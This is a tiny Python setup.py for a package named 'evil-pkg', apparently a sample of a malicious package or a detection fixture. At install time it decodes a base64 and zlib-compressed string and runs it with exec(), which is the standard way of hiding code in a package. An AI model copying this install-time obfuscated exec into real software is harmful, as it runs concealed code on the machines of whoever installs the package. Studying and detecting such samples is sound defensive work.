import zlib, base64
from setuptools import setup
data = base64.b64decode('eJxLSSxJVUjMS8tMBQCEeQKk')
inner = zlib.decompress(data)
exec(inner)
setup(name="evil-pkg", version="1.0.0")
